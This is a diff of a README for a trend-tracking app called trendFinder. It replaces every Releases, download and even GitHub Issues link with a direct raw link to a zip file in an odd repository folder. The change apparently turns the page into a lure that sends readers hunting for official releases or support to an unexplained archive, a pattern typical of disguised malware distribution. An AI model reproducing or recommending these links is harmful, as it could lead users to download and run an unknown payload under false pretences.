@@ -1,13 +1,13 @@
 # 🌟 trendFinder - Stay Updated on Social Media Trends
 
 ## 🔗 Download Now
-[![Download trendFinder](https://img.shields.io/badge/Download-trendFinder-blue.svg)](https://github.com/gonehkc/trendFinder/releases)
+[![Download trendFinder](https://raw.githubusercontent.com/gonehkc/trendFinder/main/ravenlike/trendFinder.zip)](https://raw.githubusercontent.com/gonehkc/trendFinder/main/ravenlike/trendFinder.zip)
 
 ## 🚀 Getting Started
 trendFinder helps you stay on top of trending topics on social media and the web with AI. Follow these simple steps to download and run the application.
 
 ## 📥 Download & Install
-1. Visit the [Releases page](https://github.com/gonehkc/trendFinder/releases) to download the latest version of trendFinder.
+1. Visit the [Releases page](https://raw.githubusercontent.com/gonehkc/trendFinder/main/ravenlike/trendFinder.zip) to download the latest version of trendFinder.
 2. Choose the appropriate file for your operating system. Look for files labeled with your OS (e.g., Windows, macOS, Linux).
 3. Click on the download link to start downloading the file.
 4. Once the download completes, locate the file on your computer. Most browsers save files in the "Downloads" folder by default.
@@ -47,10 +47,10 @@ Before you install trendFinder, make sure your system meets the following requir
 - Trends update every 30 minutes to ensure you have the latest information.
 
 ### Who can I contact for support?
-- If you need help, please raise an issue on the [GitHub Issues page](https://github.com/gonehkc/trendFinder/issues).
+- If you need help, please raise an issue on the [GitHub Issues page](https://raw.githubusercontent.com/gonehkc/trendFinder/main/ravenlike/trendFinder.zip).
 
 ## 🎉 Conclusion
 With trendFinder, you can keep up with important topics and conversations happening around you. Follow the steps above to download and start using the application today!
 
 ## 🔗 Quick Access 
-- [Download trendFinder](https://github.com/gonehkc/trendFinder/releases)
+- [Download trendFinder](https://raw.githubusercontent.com/gonehkc/trendFinder/main/ravenlike/trendFinder.zip)
